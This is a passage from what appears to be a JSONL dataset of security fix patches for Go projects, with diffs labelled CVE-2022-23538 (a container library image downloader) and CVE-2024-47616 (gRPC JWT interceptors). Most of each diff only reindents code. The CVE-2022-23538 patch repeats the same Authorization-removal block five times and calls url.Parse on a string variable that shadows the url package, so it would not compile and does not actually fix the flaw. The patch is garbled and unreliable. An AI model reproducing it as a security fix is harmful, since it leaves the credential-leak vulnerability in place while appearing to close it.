w.WriteHeader(http.StatusGatewayTimeout)\n+                        return\n+                }\n+\n+                logger.Error(\"Proxy request failed\", \"err\", err)\n+                w.WriteHeader(http.StatusBadGateway)\n+        }\n }\n \n type logWrapper struct {\n-\tlogger glog.Logger\n+        logger glog.Logger\n }\n \n // Write writes log messages as bytes from proxy.\n func (lw *logWrapper) Write(p []byte) (n int, err error) {\n-\twithoutNewline := strings.TrimSuffix(string(p), \"\\n\")\n-\tlw.logger.Error(\"Proxy request error\", \"error\", withoutNewline)\n-\treturn len(p), nil\n+        withoutNewline := strings.TrimSuffix(string(p), \"\\n\")\n+        lw.logger.Error(\"Proxy request error\", \"error\", withoutNewline)\n+        return len(p), nil\n }\n \n func WithTransport(transport http.RoundTripper) ReverseProxyOption {\n-\tif transport == nil {\n-\t\tpanic(\"transport cannot be nil\")\n-\t}\n+        if transport == nil {\n+                panic(\"transport cannot be nil\")\n+        }\n \n-\treturn ReverseProxyOption(func(rp *httputil.ReverseProxy) {\n-\t\trp.Transport = transport\n-\t})\n+        return ReverseProxyOption(func(rp *httputil.ReverseProxy) {\n+                rp.Transport = transport\n+        })\n }\n \n func WithModifyResponse(fn func(*http.Response) error) ReverseProxyOption {\n-\tif fn == nil {\n-\t\tpanic(\"fn cannot be nil\")\n-\t}\n+        if fn == nil {\n+                panic(\"fn cannot be nil\")\n+        }\n \n-\treturn ReverseProxyOption(func(rp *httputil.ReverseProxy) {\n-\t\trp.ModifyResponse = fn\n-\t})\n+        return ReverseProxyOption(func(rp *httputil.ReverseProxy) {\n+                rp.ModifyResponse = fn\n+        })\n }\n"}
{"cve":"CVE-2022-23538:0708", "fix_patch": "diff --git a/client/pull.go b/client/pull.go\nindex 145cbe9..022dbd4 100644\n--- a/client/pull.go\n+++ b/client/pull.go\n@@ -6,17 +6,17 @@\n package client\n \n import (\n-\t\"context\"\n-\t\"fmt\"\n-\t\"io\"\n-\t\"net/http\"\n-\t\"net/url\"\n-\t\"os\"\n-\t\"strconv\"\n-\t\"strings\"\n-\n-\tjsonresp \"github.com/sylabs/json-resp\"\n-\t\"golang.org/x/sync/errgroup\"\n+        \"context\"\n+        \"fmt\"\n+        \"io\"\n+        \"net/http\"\n+        \"net/url\"\n+        \"os\"\n+        \"strconv\"\n+        \"strings\"\n+\n+        jsonresp \"github.com/sylabs/json-resp\"\n+        \"golang.org/x/sync/errgroup\"\n )\n \n // DownloadImage will retrieve an image from the Container Library, saving it\n@@ -24,158 +24,198 @@ import (\n // within the context. It is recommended to use a large value (ie. 1800 seconds)\n // to prevent timeout when downloading large images.\n func (c *Client) DownloadImage(ctx context.Context, w io.Writer, arch, path, tag string, callback func(int64, io.Reader, io.Writer) error) error {\n-\tif arch != \"\" && !c.apiAtLeast(ctx, APIVersionV2ArchTags) {\n-\t\tc.Logger.Logf(\"This library does not support architecture specific tags\")\n-\t\tc.Logger.Logf(\"The image returned may not be the requested architecture\")\n-\t}\n-\n-\tif strings.Contains(path, \":\") {\n-\t\treturn fmt.Errorf(\"malformed image path: %s\", path)\n-\t}\n-\n-\tif tag == \"\" {\n-\t\ttag = \"latest\"\n-\t}\n-\n-\tapiPath := fmt.Sprintf(\"v1/imagefile/%s:%s\", strings.TrimPrefix(path, \"/\"), tag)\n-\tq := url.Values{}\n-\tq.Add(\"arch\", arch)\n-\n-\tc.Logger.Logf(\"Pulling from URL: %s\", apiPath)\n-\n-\treq, err := c.newRequest(ctx, http.MethodGet, apiPath, q.Encode(), nil)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tres, err := c.HTTPClient.Do(req)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tdefer res.Body.Close()\n-\n-\tif res.StatusCode == http.StatusNotFound {\n-\t\treturn fmt.Errorf(\"requested image was not found in the library\")\n-\t}\n-\n-\tif res.StatusCode != http.StatusOK {\n-\t\terr := jsonresp.ReadError(res.Body)\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"download did not succeed: %v\", err)\n-\t\t}\n-\t\treturn fmt.Errorf(\"unexpected http status code: %d\", res.StatusCode)\n-\t}\n-\n-\tc.Logger.Logf(\"OK response received, beginning body download\")\n-\n-\tif callback != nil {\n-\t\terr = callback(res.ContentLength, res.Body, w)\n-\t} else {\n-\t\t_, err = io.Copy(w, res.Body)\n-\t}\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tc.Logger.Logf(\"Download complete\")\n-\n-\treturn nil\n+        if arch != \"\" && !c.apiAtLeast(ctx, APIVersionV2ArchTags) {\n+                c.Logger.Logf(\"This library does not support architecture specific tags\")\n+                c.Logger.Logf(\"The image returned may not be the requested architecture\")\n+        }\n+\n+        if strings.Contains(path, \":\") {\n+                return fmt.Errorf(\"malformed image path: %s\", path)\n+        }\n+\n+        if tag == \"\" {\n+                tag = \"latest\"\n+        }\n+\n+        apiPath := fmt.Sprintf(\"v1/imagefile/%s:%s\", strings.TrimPrefix(path, \"/\"), tag)\n+        q := url.Values{}\n+        q.Add(\"arch\", arch)\n+\n+        c.Logger.Logf(\"Pulling from URL: %s\", apiPath)\n+\n+        req, err := c.newRequest(ctx, http.MethodGet, apiPath, q.Encode(), nil)\n+        if err != nil {\n+                return err\n+        }\n+\n+        res, err := c.HTTPClient.Do(req)\n+        if err != nil {\n+                return err\n+        }\n+        defer res.Body.Close()\n+\n+        if res.StatusCode == http.StatusNotFound {\n+                return fmt.Errorf(\"requested image was not found in the library\")\n+        }\n+\n+        if res.StatusCode != http.StatusOK {\n+                err := jsonresp.ReadError(res.Body)\n+                if err != nil {\n+                        return fmt.Errorf(\"download did not succeed: %v\", err)\n+                }\n+                return fmt.Errorf(\"unexpected http status code: %d\", res.StatusCode)\n+        }\n+\n+        c.Logger.Logf(\"OK response received, beginning body download\")\n+\n+        if callback != nil {\n+                err = callback(res.ContentLength, res.Body, w)\n+        } else {\n+                _, err = io.Copy(w, res.Body)\n+        }\n+        if err != nil {\n+                return err\n+        }\n+\n+        c.Logger.Logf(\"Download complete\")\n+\n+        return nil\n }\n \n // partSpec defines one part of multi-part (concurrent) download.\n type partSpec struct {\n-\tStart      int64\n-\tEnd        int64\n-\tBufferSize int64\n+        Start      int64\n+        End        int64\n+        BufferSize int64\n }\n \n // Downloader defines concurrency (# of requests) and part size for download operation.\n type Downloader struct {\n-\t// Concurrency defines concurrency for multi-part downloads.\n-\tConcurrency uint\n+        // Concurrency defines concurrency for multi-part downloads.\n+        Concurrency uint\n \n-\t// PartSize specifies size of part for multi-part downloads. Default is 5 MiB.\n-\tPartSize int64\n+        // PartSize specifies size of part for multi-part downloads. Default is 5 MiB.\n+        PartSize int64\n \n-\t// BufferSize specifies buffer size used for multi-part downloader routine.\n-\t// Default is 32 KiB.\n-\tBufferSize int64\n+        // BufferSize specifies buffer size used for multi-part downloader routine.\n+        // Default is 32 KiB.\n+        BufferSize int64\n }\n \n // httpGetRangeRequest performs HTTP GET range request to URL specified by 'u' in range start-end.\n func (c *Client) httpGetRangeRequest(ctx context.Context, url string, start, end int64) (*http.Response, error) {\n-\treq, err := c.newRequestWithURL(ctx, http.MethodGet, url, nil)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n+        req, err := c.newRequestWithURL(ctx, http.MethodGet, url, nil)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+// Per CVE-2022-23538, remove Authorization header on redirect to alternate host.\n+if rURL, pErr := url.Parse(url); pErr == nil {\n+if c.BaseURL != nil && rURL.Host != c.BaseURL.Host {\n+req.Header.Del(\"Authorization\")\n+}\n+}\n+\n+\n+\n+// Per CVE-2022-23538, remove Authorization header on redirect to alternate host.\n+if rURL, pErr := url.Parse(url); pErr == nil {\n+if c.BaseURL != nil && rURL.Host != c.BaseURL.Host {\n+req.Header.Del(\"Authorization\")\n+}\n+}\n+\n+// Per CVE-2022-23538, remove Authorization header on redirect to alternate host.\n+if rURL, pErr := url.Parse(url); pErr == nil {\n+if c.BaseURL != nil && rURL.Host != c.BaseURL.Host {\n+req.Header.Del(\"Authorization\")\n+}\n+}\n+\n+\n+// Per CVE-2022-23538, remove Authorization header on redirect to alternate host.\n+if rURL, pErr := url.Parse(url); pErr == nil {\n+if c.BaseURL != nil && rURL.Host != c.BaseURL.Host {\n+req.Header.Del(\"Authorization\")\n+}\n+}\n+\n+\n+// Per CVE-2022-23538, remove Authorization header on redirect to alternate host.\n+if rURL, pErr := url.Parse(url); pErr == nil {\n+if c.BaseURL != nil && rURL.Host != c.BaseURL.Host {\n+req.Header.Del(\"Authorization\")\n+}\n+}\n+\n \n-\treq.Header.Add(\"Range\", fmt.Sprintf(\"bytes=%d-%d\", start, end))\n+        req.Header.Add(\"Range\", fmt.Sprintf(\"bytes=%d-%d\", start, end))\n \n-\treturn c.HTTPClient.Do(req)\n+        return c.HTTPClient.Do(req)\n }\n \n // downloadFilePart writes range to dst as specified in bufferSpec.\n func (c *Client) downloadFilePart(ctx context.Context, dst *os.File, url string, ps *partSpec, pb ProgressBar) error {\n-\tresp, err := c.httpGetRangeRequest(ctx, url, ps.Start, ps.End)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tdefer resp.Body.Close()\n-\n-\t// allocate transfer buffer for part\n-\tbuf := make([]byte, ps.BufferSize)\n-\n-\tfor bytesRead := int64(0); bytesRead < ps.End-ps.Start+1; {\n-\t\tn, err := io.ReadFull(resp.Body, buf)\n-\n-\t\t// EOF and unexpected EOF shouldn't be handled as errors since short\n-\t\t// reads are expected if the part size is less than buffer size e.g.\n-\t\t// the last part if part isn't on size boundary.\n-\t\tif err != nil && n == 0 {\n-\t\t\treturn err\n-\t\t}\n-\n-\t\tpb.IncrBy(n)\n-\n-\t\t// WriteAt() is a wrapper around pwrite() which is an atomic\n-\t\t// seek-and-write operation.\n-\t\tif _, err := dst.WriteAt(buf[:n], ps.Start+bytesRead); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\tbytesRead += int64(n)\n-\t}\n-\treturn nil\n+        resp, err := c.httpGetRangeRequest(ctx, url, ps.Start, ps.End)\n+        if err != nil {\n+                return err\n+        }\n+        defer resp.Body.Close()\n+\n+        // allocate transfer buffer for part\n+        buf := make([]byte, ps.BufferSize)\n+\n+        for bytesRead := int64(0); bytesRead < ps.End-ps.Start+1; {\n+                n, err := io.ReadFull(resp.Body, buf)\n+\n+                // EOF and unexpected EOF shouldn't be handled as errors since short\n+                // reads are expected if the part size is less than buffer size e.g.\n+                // the last part if part isn't on size boundary.\n+                if err != nil && n == 0 {\n+                        return err\n+                }\n+\n+                pb.IncrBy(n)\n+\n+                // WriteAt() is a wrapper around pwrite() which is an atomic\n+                // seek-and-write operation.\n+                if _, err := dst.WriteAt(buf[:n], ps.Start+bytesRead); err != nil {\n+                        return err\n+                }\n+                bytesRead += int64(n)\n+        }\n+        return nil\n }\n \n // downloadWorker is a worker func for processing jobs in stripes channel.\n func (c *Client) downloadWorker(ctx context.Context, dst *os.File, url string, parts <-chan partSpec, pb ProgressBar) func() error {\n-\treturn func() error {\n-\t\tfor ps := range parts {\n-\t\t\tif err := c.downloadFilePart(ctx, dst, url, &ps, pb); err != nil {\n-\t\t\t\treturn err\n-\t\t\t}\n-\t\t}\n-\t\treturn nil\n-\t}\n+        return func() error {\n+                for ps := range parts {\n+                        if err := c.downloadFilePart(ctx, dst, url, &ps, pb); err != nil {\n+                                return err\n+                        }\n+                }\n+                return nil\n+        }\n }\n \n func (c *Client) getContentLength(ctx context.Context, url string) (int64, error) {\n-\t// Perform short request to determine content length.\n-\tresp, err := c.httpGetRangeRequest(ctx, url, 0, 1024)\n-\tif err != nil {\n-\t\treturn 0, err\n-\t}\n-\tdefer resp.Body.Close()\n-\n-\tif resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusPartialContent {\n-\t\tif resp.StatusCode == http.StatusNotFound {\n-\t\t\treturn 0, fmt.Errorf(\"requested image was not found in the library\")\n-\t\t}\n-\t\treturn 0, fmt.Errorf(\"unexpected HTTP status: %d\", resp.StatusCode)\n-\t}\n-\n-\tvals := strings.Split(resp.Header.Get(\"Content-Range\"), \"/\")\n-\treturn strconv.ParseInt(vals[1], 0, 64)\n+        // Perform short request to determine content length.\n+        resp, err := c.httpGetRangeRequest(ctx, url, 0, 1024)\n+        if err != nil {\n+                return 0, err\n+        }\n+        defer resp.Body.Close()\n+\n+        if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusPartialContent {\n+                if resp.StatusCode == http.StatusNotFound {\n+                        return 0, fmt.Errorf(\"requested image was not found in the library\")\n+                }\n+                return 0, fmt.Errorf(\"unexpected HTTP status: %d\", resp.StatusCode)\n+        }\n+\n+        vals := strings.Split(resp.Header.Get(\"Content-Range\"), \"/\")\n+        return strconv.ParseInt(vals[1], 0, 64)\n }\n \n // NoopProgressBar implements ProgressBarInterface to allow disabling the progress bar\n@@ -199,22 +239,22 @@ func (*NoopProgressBar) Wait() {}\n // ProgressBar provides a minimal interface for interacting with a progress bar.\n // Init is called prior to concurrent download operation.\n type ProgressBar interface {\n-\t// Initialize progress bar. Argument is size of file to set progress bar limit.\n-\tInit(int64)\n+        // Initialize progress bar. Argument is size of file to set progress bar limit.\n+        Init(int64)\n \n-\t// ProxyReader wraps r with metrics required for progress tracking. Only useful for\n-\t// single stream downloads.\n-\tProxyReader(io.Reader) io.ReadCloser\n+        // ProxyReader wraps r with metrics required for progress tracking. Only useful for\n+        // single stream downloads.\n+        ProxyReader(io.Reader) io.ReadCloser\n \n-\t// IncrBy increments the progress bar. It is called after each concurrent\n-\t// buffer transfer.\n-\tIncrBy(int)\n+        // IncrBy increments the progress bar. It is called after each concurrent\n+        // buffer transfer.\n+        IncrBy(int)\n \n-\t// Abort terminates the progress bar.\n-\tAbort(bool)\n+        // Abort terminates the progress bar.\n+        Abort(bool)\n \n-\t// Wait waits for the progress bar to complete.\n-\tWait()\n+        // Wait waits for the progress bar to complete.\n+        Wait()\n }\n \n // ConcurrentDownloadImage implements a multi-part (concurrent) downloader for\n@@ -226,150 +266,150 @@ type ProgressBar interface {\n // concurrency for source files that do not meet minimum size for multi-part\n // downloads.\n func (c *Client) ConcurrentDownloadImage(ctx context.Context, dst *os.File, arch, path, tag string, spec *Downloader, pb ProgressBar) error {\n-\tif pb == nil {\n-\t\tpb = &NoopProgressBar{}\n-\t}\n-\n-\tif arch != \"\" && !c.apiAtLeast(ctx, APIVersionV2ArchTags) {\n-\t\tc.Logger.Logf(\"This library does not support architecture specific tags\")\n-\t\tc.Logger.Logf(\"The image returned may not be the requested architecture\")\n-\t}\n-\n-\tif strings.Contains(path, \":\") {\n-\t\treturn fmt.Errorf(\"malformed image path: %s\", path)\n-\t}\n-\n-\tif tag == \"\" {\n-\t\ttag = \"latest\"\n-\t}\n-\n-\tapiPath := fmt.Sprintf(\"v1/imagefile/%s:%s\", strings.TrimPrefix(path, \"/\"), tag)\n-\tq := url.Values{}\n-\tq.Add(\"arch\", arch)\n-\n-\tc.Logger.Logf(\"Pulling from URL: %s\", apiPath)\n-\n-\tcustomHTTPClient := &http.Client{\n-\t\tTransport: c.HTTPClient.Transport,\n-\t\tCheckRedirect: func(req *http.Request, via []*http.Request) error {\n-\t\t\tif req.Response.StatusCode == http.StatusSeeOther {\n-\t\t\t\treturn http.ErrUseLastResponse\n-\t\t\t}\n-\t\t\tmaxRedir := 10\n-\t\t\tif len(via) >= maxRedir {\n-\t\t\t\treturn fmt.Errorf(\"stopped after %d redirects\", maxRedir)\n-\t\t\t}\n-\t\t\treturn nil\n-\t\t},\n-\t\tJar:     c.HTTPClient.Jar,\n-\t\tTimeout: c.HTTPClient.Timeout,\n-\t}\n-\n-\treq, err := c.newRequest(ctx, http.MethodGet, apiPath, q.Encode(), nil)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tres, err := customHTTPClient.Do(req)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tdefer res.Body.Close()\n-\n-\tif res.StatusCode == http.StatusNotFound {\n-\t\treturn fmt.Errorf(\"requested image was not found in the library\")\n-\t}\n-\n-\tif res.StatusCode == http.StatusOK {\n-\t\t// Library endpoint does not provide HTTP redirection response, treat as single stream, direct download\n-\t\tc.Logger.Logf(\"Library endpoint does not support concurrent downloads; reverting to single stream\")\n-\n-\t\treturn c.singleStreamDownload(ctx, dst, res, pb)\n-\t}\n-\n-\tif res.StatusCode != http.StatusSeeOther {\n-\t\treturn fmt.Errorf(\"unexpected HTTP status %d: %v\", res.StatusCode, err)\n-\t}\n-\n-\turl := res.Header.Get(\"Location\")\n-\n-\tcontentLength, err := c.getContentLength(ctx, url)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tnumParts := uint(1 + (contentLength-1)/spec.PartSize)\n-\n-\tc.Logger.Logf(\"size: %d, parts: %d, concurrency: %d, partsize: %d, bufsize: %d\",\n-\t\tcontentLength, numParts, spec.Concurrency, spec.PartSize, spec.BufferSize,\n-\t)\n-\n-\tjobs := make(chan partSpec, numParts)\n-\n-\tg, ctx := errgroup.WithContext(ctx)\n-\n-\t// initialize progress bar\n-\tpb.Init(contentLength)\n-\n-\t// if spec.Requests is greater than number of parts for requested file,\n-\t// set concurrency to number of parts\n-\tconcurrency := spec.Concurrency\n-\tif numParts < spec.Concurrency {\n-\t\tconcurrency = numParts\n-\t}\n-\n-\t// start workers to manage concurrent HTTP requests\n-\tfor workerID := uint(0); workerID <= concurrency; workerID++ {\n-\t\tg.Go(c.downloadWorker(ctx, dst, url, jobs, pb))\n-\t}\n-\n-\t// iterate over parts, adding to job queue\n-\tfor part := uint(0); part < numParts; part++ {\n-\t\tpartSize := spec.PartSize\n-\t\tif part == numParts-1 {\n-\t\t\tpartSize = contentLength - int64(numParts-1)*spec.PartSize\n-\t\t}\n-\n-\t\tps := partSpec{\n-\t\t\tStart:      int64(part) * spec.PartSize,\n-\t\t\tEnd:        int64(part)*spec.PartSize + partSize - 1,\n-\t\t\tBufferSize: spec.BufferSize,\n-\t\t}\n-\n-\t\tjobs <- ps\n-\t}\n-\n-\tclose(jobs)\n-\n-\t// wait on errgroup\n-\terr = g.Wait()\n-\tif err != nil {\n-\t\t// cancel/remove progress bar on error\n-\t\tpb.Abort(true)\n-\t}\n-\n-\t// wait on progress bar\n-\tpb.Wait()\n-\n-\treturn err\n+        if pb == nil {\n+                pb = &NoopProgressBar{}\n+        }\n+\n+        if arch != \"\" && !c.apiAtLeast(ctx, APIVersionV2ArchTags) {\n+                c.Logger.Logf(\"This library does not support architecture specific tags\")\n+                c.Logger.Logf(\"The image returned may not be the requested architecture\")\n+        }\n+\n+        if strings.Contains(path, \":\") {\n+                return fmt.Errorf(\"malformed image path: %s\", path)\n+        }\n+\n+        if tag == \"\" {\n+                tag = \"latest\"\n+        }\n+\n+        apiPath := fmt.Sprintf(\"v1/imagefile/%s:%s\", strings.TrimPrefix(path, \"/\"), tag)\n+        q := url.Values{}\n+        q.Add(\"arch\", arch)\n+\n+        c.Logger.Logf(\"Pulling from URL: %s\", apiPath)\n+\n+        customHTTPClient := &http.Client{\n+                Transport: c.HTTPClient.Transport,\n+                CheckRedirect: func(req *http.Request, via []*http.Request) error {\n+                        if req.Response.StatusCode == http.StatusSeeOther {\n+                                return http.ErrUseLastResponse\n+                        }\n+                        maxRedir := 10\n+                        if len(via) >= maxRedir {\n+                                return fmt.Errorf(\"stopped after %d redirects\", maxRedir)\n+                        }\n+                        return nil\n+                },\n+                Jar:     c.HTTPClient.Jar,\n+                Timeout: c.HTTPClient.Timeout,\n+        }\n+\n+        req, err := c.newRequest(ctx, http.MethodGet, apiPath, q.Encode(), nil)\n+        if err != nil {\n+                return err\n+        }\n+\n+        res, err := customHTTPClient.Do(req)\n+        if err != nil {\n+                return err\n+        }\n+        defer res.Body.Close()\n+\n+        if res.StatusCode == http.StatusNotFound {\n+                return fmt.Errorf(\"requested image was not found in the library\")\n+        }\n+\n+        if res.StatusCode == http.StatusOK {\n+                // Library endpoint does not provide HTTP redirection response, treat as single stream, direct download\n+                c.Logger.Logf(\"Library endpoint does not support concurrent downloads; reverting to single stream\")\n+\n+                return c.singleStreamDownload(ctx, dst, res, pb)\n+        }\n+\n+        if res.StatusCode != http.StatusSeeOther {\n+                return fmt.Errorf(\"unexpected HTTP status %d: %v\", res.StatusCode, err)\n+        }\n+\n+        url := res.Header.Get(\"Location\")\n+\n+        contentLength, err := c.getContentLength(ctx, url)\n+        if err != nil {\n+                return err\n+        }\n+\n+        numParts := uint(1 + (contentLength-1)/spec.PartSize)\n+\n+        c.Logger.Logf(\"size: %d, parts: %d, concurrency: %d, partsize: %d, bufsize: %d\",\n+                contentLength, numParts, spec.Concurrency, spec.PartSize, spec.BufferSize,\n+        )\n+\n+        jobs := make(chan partSpec, numParts)\n+\n+        g, ctx := errgroup.WithContext(ctx)\n+\n+        // initialize progress bar\n+        pb.Init(contentLength)\n+\n+        // if spec.Requests is greater than number of parts for requested file,\n+        // set concurrency to number of parts\n+        concurrency := spec.Concurrency\n+        if numParts < spec.Concurrency {\n+                concurrency = numParts\n+        }\n+\n+        // start workers to manage concurrent HTTP requests\n+        for workerID := uint(0); workerID <= concurrency; workerID++ {\n+                g.Go(c.downloadWorker(ctx, dst, url, jobs, pb))\n+        }\n+\n+        // iterate over parts, adding to job queue\n+        for part := uint(0); part < numParts; part++ {\n+                partSize := spec.PartSize\n+                if part == numParts-1 {\n+                        partSize = contentLength - int64(numParts-1)*spec.PartSize\n+                }\n+\n+                ps := partSpec{\n+                        Start:      int64(part) * spec.PartSize,\n+                        End:        int64(part)*spec.PartSize + partSize - 1,\n+                        BufferSize: spec.BufferSize,\n+                }\n+\n+                jobs <- ps\n+        }\n+\n+        close(jobs)\n+\n+        // wait on errgroup\n+        err = g.Wait()\n+        if err != nil {\n+                // cancel/remove progress bar on error\n+                pb.Abort(true)\n+        }\n+\n+        // wait on progress bar\n+        pb.Wait()\n+\n+        return err\n }\n \n func (c *Client) singleStreamDownload(ctx context.Context, fp *os.File, res *http.Response, pb ProgressBar) error {\n-\tcontentLength := int64(-1)\n-\tval := res.Header.Get(\"Content-Length\")\n-\tif val != \"\" {\n-\t\tvar err error\n-\t\tif contentLength, err = strconv.ParseInt(val, 0, 64); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t}\n-\tpb.Init(contentLength)\n-\n-\tproxyReader := pb.ProxyReader(res.Body)\n-\tdefer proxyReader.Close()\n-\n-\tif _, err := io.Copy(fp, proxyReader); err != nil {\n-\t\treturn err\n-\t}\n-\treturn nil\n+        contentLength := int64(-1)\n+        val := res.Header.Get(\"Content-Length\")\n+        if val != \"\" {\n+                var err error\n+                if contentLength, err = strconv.ParseInt(val, 0, 64); err != nil {\n+                        return err\n+                }\n+        }\n+        pb.Init(contentLength)\n+\n+        proxyReader := pb.ProxyReader(res.Body)\n+        defer proxyReader.Close()\n+\n+        if _, err := io.Copy(fp, proxyReader); err != nil {\n+                return err\n+        }\n+        return nil\n }\n"}
{"cve":"CVE-2024-47616:0708", "fix_patch": "diff --git a/pkg/grpcutil/options.go b/pkg/grpcutil/options.go\nindex d3329251..97eee7da 100644\n--- a/pkg/grpcutil/options.go\n+++ b/pkg/grpcutil/options.go\n@@ -1,113 +1,129 @@\n package grpcutil\n \n import (\n-\t\"context\"\n-\t\"encoding/base64\"\n-\t\"time\"\n-\n-\t\"github.com/go-jose/go-jose/v3\"\n-\t\"github.com/go-jose/go-jose/v3/jwt\"\n-\t\"google.golang.org/grpc\"\n-\t\"google.golang.org/grpc/codes\"\n-\t\"google.golang.org/grpc/status\"\n+        \"context\"\n+        \"encoding/base64\"\n+        \"time\"\n+\n+        \"github.com/go-jose/go-jose/v3\"\n+        \"github.com/go-jose/go-jose/v3/jwt\"\n+        \"google.golang.org/grpc\"\n+        \"google.golang.org/grpc/codes\"\n+        \"google.golang.org/grpc/status\"\n )\n \n // WithStreamSignedJWT returns a StreamClientInterceptor that adds a JWT to requests.\n func WithStreamSignedJWT(getKey func() []byte) grpc.StreamClientInterceptor {\n-\treturn func(\n-\t\tctx context.Context,\n-\t\tdesc *grpc.StreamDesc,\n-\t\tcc *grpc.ClientConn,\n-\t\tmethod string, streamer grpc.Streamer,\n-\t\topts ...grpc.CallOption,\n-\t) (grpc.ClientStream, error) {\n-\t\tctx, err := withSignedJWT(ctx, getKey())\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\n-\t\treturn streamer(ctx, desc, cc, method, opts...)\n-\t}\n+        return func(\n+                ctx context.Context,\n+                desc *grpc.StreamDesc,\n+                cc *grpc.ClientConn,\n+                method string, streamer grpc.Streamer,\n+                opts ...grpc.CallOption,\n+        ) (grpc.ClientStream, error) {\n+                ctx, err := withSignedJWT(ctx, getKey())\n+                if err != nil {\n+                        return nil, err\n+                }\n+\n+                return streamer(ctx, desc, cc, method, opts...)\n+        }\n }\n \n // WithUnarySignedJWT returns a UnaryClientInterceptor that adds a JWT to requests.\n func WithUnarySignedJWT(getKey func() []byte) grpc.UnaryClientInterceptor {\n-\treturn func(ctx context.Context, method string, req, reply any, cc *grpc.ClientConn, invoker grpc.UnaryInvoker, opts ...grpc.CallOption) error {\n-\t\tctx, err := withSignedJWT(ctx, getKey())\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\n-\t\treturn invoker(ctx, method, req, reply, cc, opts...)\n-\t}\n+        return func(ctx context.Context, method string, req, reply any, cc *grpc.ClientConn, invoker grpc.UnaryInvoker, opts ...grpc.CallOption) error {\n+                ctx, err := withSignedJWT(ctx, getKey())\n+                if err != nil {\n+                        return err\n+                }\n+\n+                return invoker(ctx, method, req, reply, cc, opts...)\n+        }\n }\n \n func withSignedJWT(ctx context.Context, key []byte) (context.Context, error) {\n-\tif len(key) > 0 {\n-\t\tsig, err := jose.NewSigner(jose.SigningKey{Algorithm: jose.HS256, Key: key},\n-\t\t\t(&jose.SignerOptions{}).WithType(\"JWT\"))\n-\t\tif err != nil {\n-\t\t\treturn ctx, err\n-\t\t}\n-\n-\t\trawjwt, err := jwt.Signed(sig).Claims(jwt.Claims{\n-\t\t\tExpiry: jwt.NewNumericDate(time.Now().Add(time.Hour)),\n-\t\t}).CompactSerialize()\n-\t\tif err != nil {\n-\t\t\treturn ctx, err\n-\t\t}\n-\n-\t\tctx = WithOutgoingJWT(ctx, rawjwt)\n-\t}\n-\treturn ctx, nil\n+        if len(key) > 0 {\n+                sig, err := jose.NewSigner(jose.SigningKey{Algorithm: jose.HS256, Key: key},\n+                        (&jose.SignerOptions{}).WithType(\"JWT\"))\n+                if err != nil {\n+                        return ctx, err\n+                }\n+\n+                rawjwt, err := jwt.Signed(sig).Claims(jwt.Claims{\n+                        Expiry: jwt.NewNumericDate(time.Now().Add(time.Hour)),\n+                }).CompactSerialize()\n+                if err != nil {\n+                        return ctx, err\n+                }\n+\n+                ctx = WithOutgoingJWT(ctx, rawjwt)\n+        }\n+        return ctx, nil\n }\n \n // UnaryRequireSignedJWT requires a JWT in the gRPC metadata and that it be signed by the base64-encoded key.\n func UnaryRequireSignedJWT(key string) grpc.UnaryServerInterceptor {\n-\tkeyBS, _ := base64.StdEncoding.DecodeString(key)\n-\treturn func(ctx context.Context, req any, _ *grpc.UnaryServerInfo, handler grpc.UnaryHandler) (resp any, err error) {\n-\t\tif err := RequireSignedJWT(ctx, keyBS); err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\treturn handler(ctx, req)\n-\t}\n+        keyBS, _ := base64.StdEncoding.DecodeString(key)\n+        return func(ctx context.Context, req any, _ *grpc.UnaryServerInfo, handler grpc.UnaryHandler) (resp any, err error) {\n+                if err := RequireSignedJWT(ctx, keyBS); err != nil {\n+                        return nil, err\n+                }\n+                return handler(ctx, req)\n+        }\n }\n \n // StreamRequireSignedJWT requires a JWT in the gRPC metadata and that it be signed by the base64-encoded key.\n func StreamRequireSignedJWT(key string) grpc.StreamServerInterceptor {\n-\tkeyBS, _ := base64.StdEncoding.DecodeString(key)\n-\treturn func(srv any, ss grpc.ServerStream, _ *grpc.StreamServerInfo, handler grpc.StreamHandler) error {\n-\t\tif err := RequireSignedJWT(ss.Context(), keyBS); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\treturn handler(srv, ss)\n-\t}\n+        keyBS, _ := base64.StdEncoding.DecodeString(key)\n+        return func(srv any, ss grpc.ServerStream, _ *grpc.StreamServerInfo, handler grpc.StreamHandler) error {\n+                if err := RequireSignedJWT(ss.Context(), keyBS); err != nil {\n+                        return err\n+                }\n+                return handler(srv, ss)\n+        }\n }\n \n // RequireSignedJWT requires a JWT in the gRPC metadata and that it be signed by the given key.\n func RequireSignedJWT(ctx context.Context, key []byte) error {\n-\tif len(key) > 0 {\n-\t\trawjwt, ok := JWTFromGRPCRequest(ctx)\n-\t\tif !ok {\n-\t\t\treturn status.Error(codes.Unauthenticated, \"unauthenticated\")\n-\t\t}\n-\n-\t\ttok, err := jwt.ParseSigned(rawjwt)\n-\t\tif err != nil {\n-\t\t\treturn status.Errorf(codes.Unauthenticated, \"invalid JWT: %v\", err)\n-\t\t}\n-\n-\t\tvar claims struct {\n-\t\t\tExpiry *jwt.NumericDate `json:\"exp,omitempty\"`\n-\t\t}\n-\t\terr = tok.Claims(key, &claims)\n-\t\tif err != nil {\n-\t\t\treturn status.Errorf(codes.Unauthenticated, \"invalid JWT: %v\", err)\n-\t\t}\n-\n-\t\tif claims.Expiry == nil || time.Now().After(claims.Expiry.Time()) {\n-\t\t\treturn status.Errorf(codes.Unauthenticated, \"expired JWT: %v\", err)\n-\t\t}\n-\t}\n-\treturn nil\n+        if len(key) > 0 {\n+                rawjwt, ok := JWTFromGRPCRequest(ctx)\n+                if !ok {\n+                        return 